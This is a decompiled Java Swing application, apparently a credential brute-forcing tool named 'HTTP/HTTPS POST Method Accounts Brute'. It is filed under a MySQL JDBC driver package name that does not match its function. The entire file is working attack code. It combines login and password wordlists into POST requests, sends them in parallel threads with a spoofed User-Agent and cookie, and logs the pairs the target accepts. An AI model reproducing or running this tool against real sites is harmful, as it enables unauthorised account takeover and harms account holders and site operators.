/*
 * Decompiled with CFR 0.152.
 */
package com.mysql.jdbc.jdbc2.optional;

import java.awt.EventQueue;
import java.awt.TextArea;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.concurrent.ForkJoinPool;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.stream.Stream;
import javax.net.ssl.HttpsURLConnection;
import javax.swing.DefaultComboBoxModel;
import javax.swing.GroupLayout;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFileChooser;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JTextField;
import javax.swing.LayoutStyle;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;
import javax.swing.filechooser.FileSystemView;

public class GuiHttpPostBrute_Nirvana
extends JFrame {
    private List<String> logins = new ArrayList<String>();
    private List<String> passwords = new ArrayList<String>();
    private JButton jButton1;
    private JButton jButton2;
    private JButton jButton3;
    private JComboBox<String> jComboBox1;
    private JLabel jLabel1;
    private JLabel jLabel10;
    private JLabel jLabel2;
    private JLabel jLabel3;
    private JLabel jLabel4;
    private JLabel jLabel5;
    private JLabel jLabel6;
    private JLabel jLabel7;
    private JLabel jLabel8;
    private JLabel jLabel9;
    private JTextField jTextField1;
    private JTextField jTextField10;
    private JTextField jTextField2;
    private JTextField jTextField3;
    private JTextField jTextField4;
    private JTextField jTextField5;
    private JTextField jTextField6;
    private JTextField jTextField7;
    private JTextField jTextField8;
    private JTextField jTextField9;
    private TextArea textArea1;

    public GuiHttpPostBrute_Nirvana() {
        this.initComponents();
    }

    private void initComponents() {
        this.jTextField1 = new JTextField();
        this.jLabel1 = new JLabel();
        this.jLabel2 = new JLabel();
        this.jTextField2 = new JTextField();
        this.textArea1 = new TextArea();
        this.jLabel3 = new JLabel();
        this.jButton1 = new JButton();
        this.jTextField3 = new JTextField();
        this.jLabel4 = new JLabel();
        this.jTextField5 = new JTextField();
        this.jButton2 = new JButton();
        this.jLabel6 = new JLabel();
        this.jTextField6 = new JTextField();
        this.jLabel7 = new JLabel();
        this.jTextField7 = new JTextField();
        this.jButton3 = new JButton();
        this.jTextField4 = new JTextField();
        this.jLabel5 = new JLabel();
        this.jTextField8 = new JTextField();
        this.jLabel8 = new JLabel();
        this.jTextField9 = new JTextField();
        this.jLabel9 = new JLabel();
        this.jComboBox1 = new JComboBox();
        this.jTextField10 = new JTextField();
        this.jLabel10 = new JLabel();
        this.setDefaultCloseOperation(3);
        this.setTitle("HTTP/HTTPS POST Method Accounts Brute");
        this.jTextField1.setToolTipText("");
        this.jTextField1.addActionListener(new ActionListener(this){
            final /* synthetic */ GuiHttpPostBrute_Nirvana this$0;
            {
                this.this$0 = guiHttpPostBrute_Nirvana;
            }

            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute_Nirvana.access$0(this.this$0, evt);
            }
        });
        this.jLabel1.setText("URL");
        this.jLabel2.setText("Path to list with logins");
        this.jTextField2.setToolTipText("");
        this.jLabel3.setText("Log");
        this.jButton1.setText("Start");
        this.jButton1.setToolTipText("");
        this.jButton1.addActionListener(new ActionListener(this){
            final /* synthetic */ GuiHttpPostBrute_Nirvana this$0;
            {
                this.this$0 = guiHttpPostBrute_Nirvana;
            }

            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute_Nirvana.access$1(this.this$0, evt);
            }
        });
        this.jTextField3.setText("0/0");
        this.jLabel4.setText("Threads");
        this.jTextField5.setText("1");
        this.jTextField5.setToolTipText("");
        this.jButton2.setText("...");
        this.jButton2.addActionListener(new ActionListener(this){
            final /* synthetic */ GuiHttpPostBrute_Nirvana this$0;
            {
                this.this$0 = guiHttpPostBrute_Nirvana;
            }

            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute_Nirvana.access$2(this.this$0, evt);
            }
        });
        this.jLabel6.setText("Allowed/Disallowed context on page");
        this.jTextField6.setToolTipText("");
        this.jTextField6.addActionListener(new ActionListener(this){
            final /* synthetic */ GuiHttpPostBrute_Nirvana this$0;
            {
                this.this$0 = guiHttpPostBrute_Nirvana;
            }

            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute_Nirvana.access$3(this.this$0, evt);
            }
        });
        this.jLabel7.setText("Path to list with passwords");
        this.jTextField7.setToolTipText("");
        this.jButton3.setText("...");
        this.jButton3.addActionListener(new ActionListener(this){
            final /* synthetic */ GuiHttpPostBrute_Nirvana this$0;
            {
                this.this$0 = guiHttpPostBrute_Nirvana;
            }

            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute_Nirvana.access$4(this.this$0, evt);
            }
        });
        this.jTextField4.setToolTipText("");
        this.jTextField4.addActionListener(new ActionListener(this){
            final /* synthetic */ GuiHttpPostBrute_Nirvana this$0;
            {
                this.this$0 = guiHttpPostBrute_Nirvana;
            }

            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute_Nirvana.access$5(this.this$0, evt);
            }
        });
        this.jLabel5.setText("POST Request line. For example: name={login}&pass={password}&parameter=value");
        this.jTextField8.setToolTipText("");
        this.jTextField8.addActionListener(new ActionListener(this){
            final /* synthetic */ GuiHttpPostBrute_Nirvana this$0;
            {
                this.this$0 = guiHttpPostBrute_Nirvana;
            }

            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute_Nirvana.access$6(this.this$0, evt);
            }
        });
        this.jLabel8.setText("Cookie");
        this.jTextField9.setText("Mozilla/5.0");
        this.jTextField9.setToolTipText("");
        this.jTextField9.addActionListener(new ActionListener(this){
            final /* synthetic */ GuiHttpPostBrute_Nirvana this$0;
            {
                this.this$0 = guiHttpPostBrute_Nirvana;
            }

            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute_Nirvana.access$7(this.this$0, evt);
            }
        });
        this.jLabel9.setText("User-Agent");
        this.jLabel9.setToolTipText("");
        this.jComboBox1.setModel(new DefaultComboBoxModel<String>(new String[]{"By Allowed context on page", "By Disallowed context on page"}));
        this.jTextField10.setText("0");
        this.jTextField10.setToolTipText("");
        this.jTextField10.addActionListener(new ActionListener(this){
            final /* synthetic */ GuiHttpPostBrute_Nirvana this$0;
            {
                this.this$0 = guiHttpPostBrute_Nirvana;
            }

            public void actionPerformed(ActionEvent evt) {
                GuiHttpPostBrute_Nirvana.access$8(this.this$0, evt);
            }
        });
        this.jLabel10.setText("Delay");
        GroupLayout layout = new GroupLayout(this.getContentPane());
        this.getContentPane().setLayout(layout);
        layout.setHorizontalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addContainerGap().addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.jTextField1).addComponent(this.jTextField4).addGroup(layout.createSequentialGroup().addComponent(this.jLabel5).addGap(0, 0, Short.MAX_VALUE)).addGroup(layout.createSequentialGroup().addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING).addComponent(this.jTextField2, GroupLayout.Alignment.LEADING, -2, 464, -2).addComponent(this.jLabel1, GroupLayout.Alignment.LEADING).addComponent(this.jLabel2, GroupLayout.Alignment.LEADING)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jButton2, -1, -1, Short.MAX_VALUE)).addGroup(layout.createSequentialGroup().addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING).addComponent(this.jTextField7, GroupLayout.Alignment.LEADING, -2, 464, -2).addComponent(this.jLabel7, GroupLayout.Alignment.LEADING)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jButton3, -1, -1, Short.MAX_VALUE)).addGroup(layout.createSequentialGroup().addComponent(this.jTextField3).addPreferredGap(LayoutStyle.ComponentPlacement.UNRELATED).addComponent(this.jButton1, -2, 427, -2)).addGroup(layout.createSequentialGroup().addComponent(this.textArea1, -2, 357, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.jTextField5, GroupLayout.Alignment.TRAILING).addComponent(this.jTextField6).addComponent(this.jTextField10, GroupLayout.Alignment.TRAILING).addGroup(layout.createSequentialGroup().addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.jLabel6).addComponent(this.jLabel4).addComponent(this.jLabel10)).addGap(0, 45, Short.MAX_VALUE)))).addGroup(GroupLayout.Alignment.TRAILING, layout.createSequentialGroup().addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.jLabel8).addComponent(this.jTextField8, -2, 227, -2).addComponent(this.jLabel3)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, -1, Short.MAX_VALUE).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING, false).addComponent(this.jTextField9).addComponent(this.jLabel9).addGroup(GroupLayout.Alignment.TRAILING, layout.createSequentialGroup().addGap(46, 46, 46).addComponent(this.jComboBox1, 0, 218, Short.MAX_VALUE))))).addContainerGap()));
        layout.setVerticalGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addGap(7, 7, 7).addComponent(this.jLabel1).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jTextField1, -2, -1, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING).addComponent(this.jTextField2, -2, -1, -2).addComponent(this.jButton2)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel7).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addGroup(layout.createParallelGroup(GroupLayout.Alignment.TRAILING).addComponent(this.jTextField7, -2, -1, -2).addComponent(this.jButton3)).addGap(18, 18, 18).addComponent(this.jLabel5).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jTextField4, -2, -1, -2).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addGroup(layout.createSequentialGroup().addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.jLabel8).addComponent(this.jLabel9)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jTextField8, -2, -1, -2)).addGroup(layout.createSequentialGroup().addGap(20, 20, 20).addComponent(this.jTextField9, -2, -1, -2))).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, 21, Short.MAX_VALUE).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING).addComponent(this.jComboBox1, GroupLayout.Alignment.TRAILING, -2, 20, -2).addComponent(this.jLabel3, GroupLayout.Alignment.TRAILING)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addGroup(layout.createParallelGroup(GroupLayout.Alignment.LEADING, false).addGroup(GroupLayout.Alignment.TRAILING, layout.createSequentialGroup().addComponent(this.jLabel6).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jTextField6, -2, -1, -2).addGap(1, 1, 1).addComponent(this.jLabel4).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jTextField5, -2, -1, -2).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jLabel10).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED).addComponent(this.jTextField10, -2, -1, -2)).addComponent(this.textArea1, -1, -1, Short.MAX_VALUE)).addPreferredGap(LayoutStyle.ComponentPlacement.RELATED, -1, Short.MAX_VALUE).addGroup(layout.createParallelGroup(GroupLayout.Alignment.BASELINE).addComponent(this.jButton1, -1, 54, Short.MAX_VALUE).addComponent(this.jTextField3, -2, -1, -2))));
        this.pack();
    }

    private void jTextField1ActionPerformed(ActionEvent evt) {
    }

    private void jButton1ActionPerformed(ActionEvent evt) {
        this.logins.clear();
        this.passwords.clear();
        new Thread(this){
            int count;
            final /* synthetic */ GuiHttpPostBrute_Nirvana this$0;
            {
                this.this$0 = guiHttpPostBrute_Nirvana;
                this.count = 0;
            }

            public void run() {
                try {
                    String line2;
                    String line;
                    File file = new File(GuiHttpPostBrute_Nirvana.access$9(this.this$0).getText());
                    BufferedReader br = new BufferedReader(new FileReader(file));
                    while ((line = br.readLine()) != null) {
                        GuiHttpPostBrute_Nirvana.access$10(this.this$0).add(line);
                    }
                    File file2 = new File(GuiHttpPostBrute_Nirvana.access$11(this.this$0).getText());
                    BufferedReader br2 = new BufferedReader(new FileReader(file2));
                    while ((line2 = br2.readLine()) != null) {
                        GuiHttpPostBrute_Nirvana.access$12(this.this$0).add(line2);
                    }
                    ArrayList<String> params = new ArrayList<String>();
                    for (String s2 : GuiHttpPostBrute_Nirvana.access$12(this.this$0)) {
                        for (String s1 : GuiHttpPostBrute_Nirvana.access$10(this.this$0)) {
                            String par = GuiHttpPostBrute_Nirvana.access$13(this.this$0).getText().replace("{login}", s1).replace("{password}", s2);
                            params.add(par);
                        }
                    }
                    GuiHttpPostBrute_Nirvana.access$14(this.this$0).setText("0/" + params.size());
                    ForkJoinPool forkJoinPool = new ForkJoinPool(Integer.parseInt(GuiHttpPostBrute_Nirvana.access$15(this.this$0).getText()));
                    forkJoinPool.submit(() -> ((Stream)Arrays.stream(params.toArray()).parallel()).forEach(par -> this.goByContext(par.toString())));
                }
                catch (Exception exception) {
                    // empty catch block
                }
            }

            private void goByContext(String par) {
                try {
                    if (this.pageContainsContext(par)) {
                        GuiHttpPostBrute_Nirvana.access$16(this.this$0).append(String.valueOf(GuiHttpPostBrute_Nirvana.access$17(this.this$0).getText()) + "?" + par + "\n");
                    }
                }
                catch (Exception ex) {
                    ex.printStackTrace();
                }
                ++this.count;
                GuiHttpPostBrute_Nirvana.access$14(this.this$0).setText(String.valueOf(this.count) + "/" + GuiHttpPostBrute_Nirvana.access$10(this.this$0).size() * GuiHttpPostBrute_Nirvana.access$12(this.this$0).size());
                try {
                    Thread.sleep(Integer.parseInt(GuiHttpPostBrute_Nirvana.access$18(this.this$0).getText()));
                }
                catch (InterruptedException interruptedException) {
                    // empty catch block
                }
            }

            private boolean pageContainsContext(String params) throws Exception {
                String urlParameters = params;
                StringBuffer response = new StringBuffer();
                URL obj = new URL(GuiHttpPostBrute_Nirvana.access$17(this.this$0).getText());
                if (GuiHttpPostBrute_Nirvana.access$17(this.this$0).getText().startsWith("https://")) {
                    String inputLine;
                    HttpsURLConnection con = (HttpsURLConnection)obj.openConnection();
                    con.setRequestMethod("POST");
                    con.setRequestProperty("User-Agent", GuiHttpPostBrute_Nirvana.access$19(this.this$0).getText());
                    con.setRequestProperty("Cookie", GuiHttpPostBrute_Nirvana.access$20(this.this$0).getText());
                    con.setDoOutput(true);
                    DataOutputStream wr = new DataOutputStream(con.getOutputStream());
                    wr.writeBytes(urlParameters);
                    wr.flush();
                    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                } else {
                    String inputLine;
                    HttpURLConnection con = (HttpURLConnection)obj.openConnection();
                    con.setRequestMethod("POST");
                    con.setRequestProperty("User-Agent", GuiHttpPostBrute_Nirvana.access$19(this.this$0).getText());
                    con.setRequestProperty("Cookie", GuiHttpPostBrute_Nirvana.access$20(this.this$0).getText());
                    con.setDoOutput(true);
                    DataOutputStream wr = new DataOutputStream(con.getOutputStream());
                    wr.writeBytes(urlParameters);
                    wr.flush();
                    BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));
                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                }
                System.out.println(response.toString());
                if (GuiHttpPostBrute_Nirvana.access$21(this.this$0).getSelectedItem().toString().equals("By Allowed context on page")) {
                    return response.toString().contains(GuiHttpPostBrute_Nirvana.access$22(this.this$0).getText());
                }
                return !response.toString().contains(GuiHttpPostBrute_Nirvana.access$22(this.this$0).getText());
            }
        }.start();
    }

    private void jButton2ActionPerformed(ActionEvent evt) {
        JFileChooser jfc = new JFileChooser(FileSystemView.getFileSystemView().getHomeDirectory());
        int returnValue = jfc.showOpenDialog(null);
        if (returnValue == 0) {
            File selectedFile = jfc.getSelectedFile();
            this.jTextField2.setText(selectedFile.getAbsolutePath());
        }
    }

    private void jTextField6ActionPerformed(ActionEvent evt) {
    }

    private void jButton3ActionPerformed(ActionEvent evt) {
    }

    private void jTextField4ActionPerformed(ActionEvent evt) {
    }

    private void jTextField8ActionPerformed(ActionEvent evt) {
    }

    private void jTextField9ActionPerformed(ActionEvent evt) {
    }

    private void jTextField10ActionPerformed(ActionEvent evt) {
    }

    public static void main(String[] args) {
        try {
            UIManager.LookAndFeelInfo[] lookAndFeelInfoArray = UIManager.getInstalledLookAndFeels();
            int n = lookAndFeelInfoArray.length;
            int n2 = 0;
            while (n2 < n) {
                UIManager.LookAndFeelInfo info = lookAndFeelInfoArray[n2];
                if ("Nimbus".equals(info.getName())) {
                    UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
                ++n2;
            }
        }
        catch (ClassNotFoundException ex) {
            Logger.getLogger(GuiHttpPostBrute_Nirvana.class.getName()).log(Level.SEVERE, null, ex);
        }
        catch (InstantiationException ex) {
            Logger.getLogger(GuiHttpPostBrute_Nirvana.class.getName()).log(Level.SEVERE, null, ex);
        }
        catch (IllegalAccessException ex) {
            Logger.getLogger(GuiHttpPostBrute_Nirvana.class.getName()).log(Level.SEVERE, null, ex);
        }
        catch (UnsupportedLookAndFeelException ex) {
            Logger.getLogger(GuiHttpPostBrute_Nirvana.class.getName()).log(Level.SEVERE, null, ex);
        }
        EventQueue.invokeLater(new Runnable(){

            public void run() {
                new GuiHttpPostBrute_Nirvana().setVisible(true);
            }
        });
    }

    static /* synthetic */ void access$0(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana, ActionEvent actionEvent) {
        guiHttpPostBrute_Nirvana.jTextField1ActionPerformed(actionEvent);
    }

    static /* synthetic */ void access$1(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana, ActionEvent actionEvent) {
        guiHttpPostBrute_Nirvana.jButton1ActionPerformed(actionEvent);
    }

    static /* synthetic */ void access$2(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana, ActionEvent actionEvent) {
        guiHttpPostBrute_Nirvana.jButton2ActionPerformed(actionEvent);
    }

    static /* synthetic */ void access$3(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana, ActionEvent actionEvent) {
        guiHttpPostBrute_Nirvana.jTextField6ActionPerformed(actionEvent);
    }

    static /* synthetic */ void access$4(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana, ActionEvent actionEvent) {
        guiHttpPostBrute_Nirvana.jButton3ActionPerformed(actionEvent);
    }

    static /* synthetic */ void access$5(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana, ActionEvent actionEvent) {
        guiHttpPostBrute_Nirvana.jTextField4ActionPerformed(actionEvent);
    }

    static /* synthetic */ void access$6(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana, ActionEvent actionEvent) {
        guiHttpPostBrute_Nirvana.jTextField8ActionPerformed(actionEvent);
    }

    static /* synthetic */ void access$7(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana, ActionEvent actionEvent) {
        guiHttpPostBrute_Nirvana.jTextField9ActionPerformed(actionEvent);
    }

    static /* synthetic */ void access$8(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana, ActionEvent actionEvent) {
        guiHttpPostBrute_Nirvana.jTextField10ActionPerformed(actionEvent);
    }

    static /* synthetic */ JTextField access$9(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana) {
        return guiHttpPostBrute_Nirvana.jTextField2;
    }

    static /* synthetic */ List access$10(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana) {
        return guiHttpPostBrute_Nirvana.logins;
    }

    static /* synthetic */ JTextField access$11(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana) {
        return guiHttpPostBrute_Nirvana.jTextField7;
    }

    static /* synthetic */ List access$12(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana) {
        return guiHttpPostBrute_Nirvana.passwords;
    }

    static /* synthetic */ JTextField access$13(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana) {
        return guiHttpPostBrute_Nirvana.jTextField4;
    }

    static /* synthetic */ JTextField access$14(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana) {
        return guiHttpPostBrute_Nirvana.jTextField3;
    }

    static /* synthetic */ JTextField access$15(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana) {
        return guiHttpPostBrute_Nirvana.jTextField5;
    }

    static /* synthetic */ TextArea access$16(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana) {
        return guiHttpPostBrute_Nirvana.textArea1;
    }

    static /* synthetic */ JTextField access$17(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana) {
        return guiHttpPostBrute_Nirvana.jTextField1;
    }

    static /* synthetic */ JTextField access$18(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana) {
        return guiHttpPostBrute_Nirvana.jTextField10;
    }

    static /* synthetic */ JTextField access$19(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana) {
        return guiHttpPostBrute_Nirvana.jTextField9;
    }

    static /* synthetic */ JTextField access$20(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana) {
        return guiHttpPostBrute_Nirvana.jTextField8;
    }

    static /* synthetic */ JComboBox access$21(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana) {
        return guiHttpPostBrute_Nirvana.jComboBox1;
    }

    static /* synthetic */ JTextField access$22(GuiHttpPostBrute_Nirvana guiHttpPostBrute_Nirvana) {
        return guiHttpPostBrute_Nirvana.jTextField6;
    }
}

